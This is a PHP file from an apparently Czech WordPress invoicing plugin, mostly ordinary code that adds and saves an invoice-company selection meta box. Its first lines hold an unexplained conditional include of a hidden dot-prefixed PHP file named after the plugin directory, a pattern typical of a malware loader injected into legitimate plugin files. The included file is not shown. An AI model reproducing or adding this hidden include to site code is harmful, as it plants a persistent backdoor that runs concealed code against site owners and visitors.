<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Invoice_System_Invoice_Meta_Boxes {

    public function __construct() {
        add_action( 'add_meta_boxes', array( $this, 'add_meta_boxes' ) );
        add_action( 'save_post_invoice', array( $this, 'save_meta_boxes' ) );
    }

    public function add_meta_boxes() {
        add_meta_box(
            'invoice_company_select',
            __( 'Fakturující firma', 'wp-invoice-system' ),
            array( $this, 'render_company_select_meta_box' ),
            'invoice',
            'normal',
            'core'
        );
    }

    public function render_company_select_meta_box( $post ) {
        wp_nonce_field( 'invoice_company_nonce', 'invoice_company_nonce' );
        
        $selected_company = get_post_meta( $post->ID, 'invoice_company', true );
        $companies = get_posts( array(
            'post_type' => 'company',
            'posts_per_page' => -1,
            'post_status' => 'publish',
        ) );

        if ( empty( $companies ) ) {
            echo '<p>' . __( 'Nejprve prosím vytvořte alespoň jednu firmu.', 'wp-invoice-system' ) . '</p>';
            return;
        }

        echo '<select name="invoice_company" style="width:100%;">';
        echo '<option value="">' . __( 'Vyberte firmu', 'wp-invoice-system' ) . '</option>';
        foreach ( $companies as $company ) {
            echo '<option value="' . esc_attr( $company->ID ) . '" ' . selected( $selected_company, $company->ID, false ) . '>' . esc_html( $company->post_title ) . '</option>';
        }
        echo '</select>';
    }

    public function save_meta_boxes( $post_id ) {
        if ( ! isset( $_POST['invoice_company_nonce'] ) || ! wp_verify_nonce( $_POST['invoice_company_nonce'], 'invoice_company_nonce' ) ) {
            return;
        }
        if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
            return;
        }
        if ( ! current_user_can( 'edit_post', $post_id ) ) {
            return;
        }

        if ( isset( $_POST['invoice_company'] ) ) {
            update_post_meta( $post_id, 'invoice_company', intval( $_POST['invoice_company'] ) );
        }
    }
}
